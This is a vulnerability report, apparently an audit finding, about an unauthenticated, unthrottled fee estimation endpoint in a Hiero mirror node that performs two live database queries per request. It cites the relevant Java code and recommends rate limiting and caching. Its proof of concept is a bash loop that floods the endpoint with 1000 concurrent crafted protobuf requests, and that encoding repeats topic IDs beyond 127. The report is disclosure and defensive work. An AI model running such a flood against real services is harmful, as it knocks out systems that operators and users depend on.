### Title
Unauthenticated STATE-Mode Fee Estimation Endpoint Causes Unbounded Live DB Reads via FeeTopicStore, Enabling DoS

### Summary
The public `POST /api/v1/network/fees?mode=STATE` endpoint in `NetworkController.estimateFees()` has no rate limiting, no authentication, and no caching. When a `ConsensusSubmitMessage` transaction is submitted in STATE mode, the fee calculator performs two live database queries per request via `FeeTopicStore` (one to `topicRepository`, one to `customFeeRepository`). An unprivileged attacker can flood this endpoint with requests referencing distinct topicIDs, exhausting the DB connection pool and causing a denial of service.

### Finding Description

**Exact code path:**

`NetworkController.estimateFees()` (lines 110–124) accepts any unauthenticated POST with no rate-limiting guard: [1](#0-0) 

When `mode=STATE`, `FeeEstimationService.estimateFees()` (lines 101–103) constructs a `FeeEstimationFeeContext` wrapping the live `FeeTopicStore`: [2](#0-1) [3](#0-2) 

`FeeEstimationFeeContext.readableStore()` returns the live `FeeTopicStore` for `ReadableTopicStore.class`: [4](#0-3) 

`FeeTopicStore.getTopic()` issues **two synchronous DB queries** per call — one to `topicRepository.findById()` and one to `customFeeRepository.findById()` — with **no caching**: [5](#0-4) [6](#0-5) 

The intentional design of live reads (no caching) is confirmed by the test comment: *"store reads live from DB, no refresh needed"*: [7](#0-6) 

**Root cause:** The `rest-java` module has no rate-limiting infrastructure applied to `NetworkController`. The throttle/bucket4j machinery (`ThrottleConfiguration`, `ThrottleManagerImpl`) exists exclusively in the `web3` module for contract calls: [8](#0-7) 

A grep of `rest-java/src/main/**/*.java` for rate-limiting constructs returns zero hits in any controller or filter — confirming the endpoint is completely unguarded.

### Impact Explanation

Each STATE-mode `ConsensusSubmitMessage` request consumes at minimum 2 DB connections/queries. With no rate limiting, an attacker sending N concurrent requests forces N×2 simultaneous DB queries. Since each topicID is distinct, no DB-level query cache or result cache can absorb the load. At sufficient request rates, the DB connection pool is exhausted, causing all mirror node services sharing the same PostgreSQL instance (importer, REST, web3) to fail with connection timeout errors — a full service DoS.

### Likelihood Explanation

The attack requires zero privileges, zero authentication, and zero cost beyond network bandwidth. The endpoint is publicly documented in the OpenAPI spec: [9](#0-8) 

A single attacker with a modest HTTP client (e.g., `wrk`, `ab`, or a simple script) can sustain thousands of requests per second. The attack is trivially repeatable and requires no special knowledge beyond the public API spec.

### Recommendation

1. **Add rate limiting to `rest-java`'s fee estimation endpoint.** Port or reuse the bucket4j pattern from `web3`'s `ThrottleConfiguration` and apply it as a filter or interceptor on `POST /api/v1/network/fees`.
2. **Add a short-lived cache to `FeeTopicStore.getTopic()`** (e.g., Caffeine with a 1–5 second TTL keyed on `topicNum`). This limits DB amplification even if rate limiting is bypassed.
3. **Consider requiring an API key or IP-based rate limiting** at the reverse proxy/ingress layer for STATE-mode requests.

### Proof of Concept

```bash
# Generate a minimal ConsensusSubmitMessage protobuf transaction (topicNum varies per request)
# Field 12 = ConsensusSubmitMessage, field 1 inside = TopicID (field 3 = topicNum)
# Send 1000 concurrent STATE-mode requests with distinct topicIDs

for i in $(seq 1 1000); do
  curl -s -X POST \
    "https://<mirror-node>/api/v1/network/fees?mode=STATE" \
    -H "Content-Type: application/protobuf" \
    --data-binary "$(python3 -c "
import struct
# Minimal ConsensusSubmitMessage with topicNum=$i
topic_num = $i
# TopicID proto: field 3 (topicNum) = varint
topic_id = b'\x18' + bytes([topic_num & 0x7f])
# ConsensusSubmitMessage proto: field 1 (topicID) = embedded message
csm_body = b'\x0a' + bytes([len(topic_id)]) + topic_id
# TransactionBody proto: field 12 (consensusSubmitMessage) = embedded message
tx_body = b'\x62' + bytes([len(csm_body)]) + csm_body
# Transaction proto: field 2 (bodyBytes) = bytes
import sys; sys.stdout.buffer.write(b'\x12' + bytes([len(tx_body)]) + tx_body)
")" &
done
wait
```

Each request triggers `FeeTopicStore.getTopic()` → `topicRepository.findById(i)` + `customFeeRepository.findById(i)` — 2 live DB queries per request, 2000 total DB queries with no throttle, rapidly exhausting the connection pool.

### Citations

**File:** rest-java/src/main/java/org/hiero/mirror/restjava/controller/NetworkController.java (L110-124)
```java
    @PostMapping(
            consumes = {"application/protobuf", "application/x-protobuf"},
            value = "/fees")
    FeeEstimateResponse estimateFees(
            @RequestBody @NotNull byte[] body,
            @RequestParam(defaultValue = "INTRINSIC", required = false) FeeEstimateMode mode,
            @RequestParam(name = HIGH_VOLUME_THROTTLE, defaultValue = "0", required = false) @Min(0) @Max(10000)
                    int highVolumeThrottle) {
        try {
            final var transaction = Transaction.PROTOBUF.parse(Bytes.wrap(body));
            return toResponse(feeEstimationService.estimateFees(transaction, mode, highVolumeThrottle));
        } catch (ParseException e) {
            throw new IllegalArgumentException("Unable to parse transaction", e);
        }
    }
```

**File:** rest-java/src/main/java/org/hiero/mirror/restjava/service/fee/FeeEstimationService.java (L101-103)
```java
            final var context = mode == FeeEstimateMode.STATE
                    ? txContext.withFeeContext(newFeeContext(txContext.body(), throttleUtilization))
                    : txContext;
```

**File:** rest-java/src/main/java/org/hiero/mirror/restjava/service/fee/FeeEstimationService.java (L118-120)
```java
    private FeeEstimationFeeContext newFeeContext(final TransactionBody body, final int throttleUtilization) {
        return new FeeEstimationFeeContext(body, feeTopicStore, feeTokenStore, throttleUtilization);
    }
```

**File:** rest-java/src/main/java/org/hiero/mirror/restjava/service/fee/FeeEstimationFeeContext.java (L196-198)
```java
        if (storeInterface == ReadableTopicStore.class) {
            return (T) topicStore;
        }
```

**File:** rest-java/src/main/java/org/hiero/mirror/restjava/service/fee/FeeTopicStore.java (L28-33)
```java
    public Topic getTopic(@NonNull final TopicID id) {
        return topicRepository
                .findById(id.topicNum())
                .map(topic -> toTopic(id, topic, customFeeRepository))
                .orElse(null);
    }
```

**File:** rest-java/src/main/java/org/hiero/mirror/restjava/service/fee/FeeTopicStore.java (L51-57)
```java
    private static List<FixedCustomFee> getCustomFees(
            final long topicId, final CustomFeeRepository customFeeRepository) {
        return customFeeRepository
                .findById(topicId)
                .filter(customFee -> !CollectionUtils.isEmpty(customFee.getFixedFees()))
                .map(customFee -> Collections.nCopies(customFee.getFixedFees().size(), FixedCustomFee.DEFAULT))
                .orElseGet(List::of);
```

**File:** rest-java/src/test/java/org/hiero/mirror/restjava/service/fee/FeeEstimationServiceTest.java (L360-367)
```java
        final var before = service.estimateFees(txn, FeeEstimateMode.STATE, 0);
        // Custom fees added after the first estimate — store reads live from DB, no refresh needed.
        domainBuilder.customFee().customize(cf -> cf.entityId(topic.getId())).persist();

        final var after = service.estimateFees(txn, FeeEstimateMode.STATE, 0);
        assertThat(before.totalTinycents()).isEqualTo(1_890_400L);
        assertThat(after.totalTinycents()).isEqualTo(500_000_000L);
    }
```

**File:** web3/src/main/java/org/hiero/mirror/web3/config/ThrottleConfiguration.java (L14-55)
```java
@Configuration(proxyBeanMethods = false)
@RequiredArgsConstructor
public class ThrottleConfiguration {

    public static final String GAS_LIMIT_BUCKET = "gasLimitBucket";
    public static final String RATE_LIMIT_BUCKET = "rateLimitBucket";
    public static final String OPCODE_RATE_LIMIT_BUCKET = "opcodeRateLimitBucket";

    private final ThrottleProperties throttleProperties;

    @Bean(name = RATE_LIMIT_BUCKET)
    Bucket rateLimitBucket() {
        long rateLimit = throttleProperties.getRequestsPerSecond();
        final var limit = Bandwidth.builder()
                .capacity(rateLimit)
                .refillGreedy(rateLimit, Duration.ofSeconds(1))
                .build();
        return Bucket.builder().addLimit(limit).build();
    }

    @Bean(name = GAS_LIMIT_BUCKET)
    Bucket gasLimitBucket() {
        long gasLimit = throttleProperties.getGasPerSecond();
        final var limit = Bandwidth.builder()
                .capacity(gasLimit)
                .refillGreedy(gasLimit, Duration.ofSeconds(1))
                .build();
        return Bucket.builder()
                .withSynchronizationStrategy(SynchronizationStrategy.SYNCHRONIZED)
                .addLimit(limit)
                .build();
    }

    @Bean(name = OPCODE_RATE_LIMIT_BUCKET)
    Bucket opcodeRateLimitBucket() {
        long rateLimit = throttleProperties.getOpcodeRequestsPerSecond();
        final var limit = Bandwidth.builder()
                .capacity(rateLimit)
                .refillGreedy(rateLimit, Duration.ofSeconds(1))
                .build();
        return Bucket.builder().addLimit(limit).build();
    }
```

**File:** rest/api/v1/openapi.yml (L916-930)
```yaml
    post:
      summary: Estimate network fees
      description: Given a HAPI transaction, estimate the network fees in tinycents.
      operationId: estimateFees
      parameters:
        - $ref: "#/components/parameters/estimateModeQueryParam"
        - $ref: "#/components/parameters/highVolumeThrottleQueryParam"
      requestBody:
        content:
          application/protobuf:
            schema:
              format: binary
              type: string
          application/x-protobuf:
            schema:
```
